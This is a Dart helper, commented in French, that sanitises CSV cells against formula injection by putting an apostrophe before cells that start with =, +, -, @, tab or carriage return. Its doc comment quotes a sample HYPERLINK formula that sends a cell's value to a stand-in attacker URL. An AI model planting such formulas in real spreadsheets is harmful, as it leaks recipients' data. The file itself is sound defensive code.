import 'package:csv/csv.dart';

/// Helpers CSV anti-injection.
///
/// H1 v2.12.1 — Une cellule string commençant par `= + - @ \t \r` peut être
/// interprétée comme **formule** par Excel/LibreOffice/Numbers lors de
/// l'ouverture du CSV. Vecteur classique d'exfiltration latérale :
/// `=HYPERLINK("http://attacker/?x=" & A1, "click")` extrait une cellule
/// adjacente vers une URL externe au moindre clic du destinataire.
///
/// On préfixe ces cellules par une apostrophe ASCII `'` qui force le tableur
/// à traiter la valeur comme texte. La donnée reste lisible (le tableur
/// masque le `'` initial) et le CSV reste valide.
///
/// Réf. : OWASP "CSV Injection" / CVE-2014-3524.
abstract final class CsvSafe {
  CsvSafe._();

  static const _dangerousLead = {'=', '+', '-', '@', '\t', '\r'};

  /// Préfixe la cellule par `'` si son premier caractère est dangereux.
  /// Retourne la valeur inchangée pour tout autre type / cellule.
  static Object? sanitizeCell(Object? cell) {
    if (cell is! String) return cell;
    if (cell.isEmpty) return cell;
    if (_dangerousLead.contains(cell[0])) return "'$cell";
    return cell;
  }

  /// Sanitize chaque cellule (récursif sur lignes) puis encode via le
  /// converter `Csv` du package csv. Drop-in replacement de
  /// `Csv().encode(rows)`.
  static String encodeSafe(List<List<dynamic>> rows) {
    final sanitized = rows
        .map((row) => row.map(sanitizeCell).toList(growable: false))
        .toList(growable: false);
    return Csv().encode(sanitized);
  }
}
